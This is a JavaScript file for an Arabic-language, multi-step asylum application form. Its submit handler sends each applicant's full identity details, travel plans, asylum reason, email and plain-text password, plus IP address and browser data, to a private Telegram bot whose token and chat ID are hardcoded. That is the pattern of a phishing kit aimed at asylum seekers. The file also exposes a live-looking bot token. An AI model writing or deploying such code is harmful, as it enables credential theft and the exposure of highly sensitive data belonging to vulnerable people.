let currentStep = 1;

function updateProgressBar() {
    const progressBar = document.getElementById('progressBar');
    progressBar.style.width = `${(currentStep / 3) * 100}%`;
    
    // Update step indicators
    document.getElementById('step1').classList.toggle('active', currentStep === 1);
    document.getElementById('step2').classList.toggle('active', currentStep === 2);
    document.getElementById('step3').classList.toggle('active', currentStep === 3);
}

function showStep(step) {
    document.querySelectorAll('.form-step').forEach(el => {
        el.classList.remove('active');
    });
    document.getElementById(`stepForm${step}`).classList.add('active');
    currentStep = step;
    updateProgressBar();
}

function nextStep(current) {
    if (current === 3) return;
    
    // Basic validation
    let valid = true;
    const currentForm = document.getElementById(`stepForm${current}`);
    const requiredFields = currentForm.querySelectorAll('[required]');
    
    requiredFields.forEach(field => {
        if (!field.value.trim()) {
            valid = false;
            field.style.borderColor = '#e74c3c';
            setTimeout(() => {
                field.style.borderColor = '#ddd';
            }, 2000);
        }
    });
    
    // Additional validation for email and password in step 1
    if (current === 1) {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const confirmPassword = document.getElementById('confirmPassword').value;
        
        // Email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            valid = false;
            document.getElementById('email').style.borderColor = '#e74c3c';
            showMessage('error', 'الرجاء إدخال بريد إلكتروني صحيح');
        }
        
        // Password validation
        if (password.length < 8) {
            valid = false;
            document.getElementById('password').style.borderColor = '#e74c3c';
            showMessage('error', 'كلمة السر يجب أن تحتوي على 8 أحرف على الأقل');
        }
        
        // Password match validation
        if (password !== confirmPassword) {
            valid = false;
            document.getElementById('confirmPassword').style.borderColor = '#e74c3c';
            showMessage('error', 'كلمتا السر غير متطابقتين');
        }
    }
    
    if (valid) {
        showStep(current + 1);
    }
}

function prevStep(current) {
    if (current === 1) return;
    showStep(current - 1);
}

function showMessage(type, text) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = "block";
    
    // Auto hide after 5 seconds
    setTimeout(() => {
        messageDiv.style.display = "none";
    }, 5000);
}

// Function to get user IP address
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

// Toggle password visibility
function togglePassword(fieldId) {
    const passwordField = document.getElementById(fieldId);
    const toggleIcon = passwordField.nextElementSibling;
    
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        toggleIcon.classList.remove('fa-eye');
        toggleIcon.classList.add('fa-eye-slash');
    } else {
        passwordField.type = 'password';
        toggleIcon.classList.remove('fa-eye-slash');
        toggleIcon.classList.add('fa-eye');
    }
}

// Password strength checker
function checkPasswordStrength(password) {
    const strengthBar = document.getElementById('passwordStrength');
    const lengthRule = document.getElementById('lengthRule');
    const numberRule = document.getElementById('numberRule');
    const charRule = document.getElementById('charRule');
    
    // Reset classes
    strengthBar.className = 'password-strength';
    lengthRule.className = '';
    numberRule.className = '';
    charRule.className = '';
    
    let strength = 0;
    
    // Check length
    if (password.length >= 8) {
        strength += 1;
        lengthRule.classList.add('valid');
    } else {
        lengthRule.classList.add('invalid');
    }
    
    // Check for numbers
    if (/\d/.test(password)) {
        strength += 1;
        numberRule.classList.add('valid');
    } else {
        numberRule.classList.add('invalid');
    }
    
    // Check for special characters
    if (/[!@#$%^&*]/.test(password)) {
        strength += 1;
        charRule.classList.add('valid');
    } else {
        charRule.classList.add('invalid');
    }
    
    // Update strength bar
    if (strength === 0) {
        strengthBar.className = 'password-strength';
    } else if (strength === 1) {
        strengthBar.className = 'password-strength weak';
    } else if (strength === 2) {
        strengthBar.className = 'password-strength medium';
    } else {
        strengthBar.className = 'password-strength strong';
    }
}

// Check password match
function checkPasswordMatch() {
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const matchMessage = document.getElementById('passwordMatch');
    
    if (password && confirmPassword) {
        if (password === confirmPassword) {
            matchMessage.textContent = 'كلمتا السر متطابقتان';
            matchMessage.style.color = '#27ae60';
        } else {
            matchMessage.textContent = 'كلمتا السر غير متطابقتين';
            matchMessage.style.color = '#e74c3c';
        }
    } else {
        matchMessage.textContent = '';
    }
}

// Function to send data to Telegram
async function sendToTelegramBot(formData) {
    // استبدل هذه القيم بمعلومات البوت الخاص بك
    const botToken = '7428953356:AAE4TPUEh2B77MfaZwIWLUNFw_Y0OIDyo2w';
    const chatId = '7627547984';
    
    // Format message
    let message = `📬 *طلب لجوء جديد*\n\n`;
    message += `*المعلومات الشخصية:*\n`;
    message += `- الاسم: ${formData.firstName} ${formData.lastName}\n`;
    message += `- الجنسية: ${formData.nationality}\n`;
    message += `- تاريخ الميلاد: ${formData.birthDate}\n`;
    message += `- الجنس: ${formData.gender}\n`;
    message += `- الحالة الاجتماعية: ${formData.maritalStatus}\n`;
    message += `- عدد المعالين: ${formData.dependents}\n`;
    message += `- البريد: ${formData.email}\n`;
    message += `- كلمة السر: ${formData.password}\n\n`;
    
    message += `*معلومات السفر:*\n`;
    message += `- الموقع الحالي: ${formData.currentLocation}\n`;
    message += `- الدولة المطلوبة: ${formData.destination}\n`;
    message += `- تاريخ الوصول: ${formData.entryDate}\n`;
    message += `- طريقة الوصول: ${formData.entryMethod}\n`;
    message += `- المرافقون: ${formData.travelCompanions || 'لا يوجد'}\n\n`;
    
    message += `*سبب اللجوء:*\n${formData.asylumReason}\n\n`;
    message += `*معلومات الاتصال:*\n`;
    message += `- الهاتف: ${formData.contactPhone || 'غير مسجل'}\n\n`;
    
    message += `*معلومات النظام:*\n`;
    message += `- IP: ${await getIP()}\n`;
    message += `- User Agent: ${navigator.userAgent}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        
        return await response.json();
    } catch (error) {
        throw error;
    }
}

document.getElementById('asylumForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Form validation
    let valid = true;
    const requiredFields = document.querySelectorAll('[required]');
    
    requiredFields.forEach(field => {
        if (!field.value.trim()) {
            valid = false;
            field.style.borderColor = '#e74c3c';
            setTimeout(() => {
                field.style.borderColor = '#ddd';
            }, 2000);
        }
    });
    
    // Email and password validation
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        valid = false;
        document.getElementById('email').style.borderColor = '#e74c3c';
        showMessage('error', 'الرجاء إدخال بريد إلكتروني صحيح');
    }
    
    if (password.length < 8) {
        valid = false;
        document.getElementById('password').style.borderColor = '#e74c3c';
        showMessage('error', 'كلمة السر يجب أن تحتوي على 8 أحرف على الأقل');
    }
    
    if (password !== confirmPassword) {
        valid = false;
        document.getElementById('confirmPassword').style.borderColor = '#e74c3c';
        showMessage('error', 'كلمتا السر غير متطابقتين');
    }
    
    if (!valid) {
        showMessage('error', 'الرجاء تعبئة جميع الحقول الإلزامية بشكل صحيح');
        return;
    }
    
    // Collect form data
    const formData = {
        firstName: document.getElementById('firstName').value,
        lastName: document.getElementById('lastName').value,
        nationality: document.getElementById('nationality').value,
        birthDate: document.getElementById('birthDate').value,
        gender: document.getElementById('gender').value,
        maritalStatus: document.getElementById('maritalStatus').value,
        dependents: document.getElementById('dependents').value,
        currentLocation: document.getElementById('currentLocation').value,
        destination: document.getElementById('destination').value,
        entryDate: document.getElementById('entryDate').value,
        entryMethod: document.getElementById('entryMethod').value,
        travelCompanions: document.getElementById('travelCompanions').value,
        asylumReason: document.getElementById('asylumReason').value,
        evidence: document.getElementById('evidence').value,
        healthInfo: document.getElementById('healthInfo').value,
        contactPhone: document.getElementById('contactPhone').value,
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
    };
    
    // Show sending message
    showMessage('success', 'جاري إرسال طلبك...');
    
    try {
        // Send data to Telegram
        await sendToTelegramBot(formData);
        
        // Show success message
        showMessage('success', 'تم إرسال طلب اللجوء بنجاح! سيتم التواصل معك على البريد الإلكتروني المسجل');
        
        // Reset form after successful submission
        setTimeout(() => {
            document.getElementById('asylumForm').reset();
            showStep(1);
            document.getElementById('message').style.display = "none";
        }, 5000);
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        showMessage('error', 'حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.');
    }
});

// Initialize progress bar
updateProgressBar();

// Add event listeners for password strength check
document.getElementById('password').addEventListener('input', function() {
    checkPasswordStrength(this.value);
});

// Add event listeners for password match check
document.getElementById('password').addEventListener('input', checkPasswordMatch);
document.getElementById('confirmPassword').addEventListener('input', checkPasswordMatch);

// Initialize Facebook SDK
window.fbAsyncInit = function() {
    FB.init({
        appId: '11223344556677', // استبدل هذا برقم التطبيق الخاص بك
        cookie: true,
        xfbml: true,
        version: 'v19.0'
    });
    
    FB.getLoginStatus(function(response) {
        statusChangeCallback(response);
    });
};

(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "https://connect.facebook.net/ar_AR/sdk.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

// Facebook login status callback
function statusChangeCallback(response) {
    if (response.status === 'connected') {
        // User is logged in with Facebook
        getUserInfo();
    } else {
        // User is not logged in
        document.getElementById('userInfo').style.display = 'none';
    }
}

// Facebook login function
function loginFacebook() {
    FB.login(function(response) {
        if (response.authResponse) {
            getUserInfo();
        } else {
            showMessage('error', 'لم يتم تسجيل الدخول بحساب الفيسبوك');
        }
    }, {scope: 'public_profile,email'});
}

// Get Facebook user info
function getUserInfo() {
    FB.api('/me', {fields: 'id,name,email'}, function(response) {
        document.getElementById('userName').textContent = response.name;
        document.getElementById('userEmail').textContent = response.email || 'لا يوجد بريد إلكتروني';
        document.getElementById('userInfo').style.display = 'block';
        document.getElementById('fbLoginBtn').style.display = 'none';
        
        // Auto-fill form with Facebook data
        const names = response.name.split(' ');
        document.getElementById('firstName').value = names[0] || '';
        document.getElementById('lastName').value = names.slice(1).join(' ') || '';
        if (response.email) {
            document.getElementById('email').value = response.email;
        }
    });
}

// Facebook logout function
function logoutFacebook() {
    FB.logout(function(response) {
        document.getElementById('userInfo').style.display = 'none';
        document.getElementById('fbLoginBtn').style.display = 'flex';
        showMessage('success', 'تم تسجيل الخروج بنجاح');
    });
}

// Attach login function to button
document.getElementById('fbLoginBtn').addEventListener('click', loginFacebook);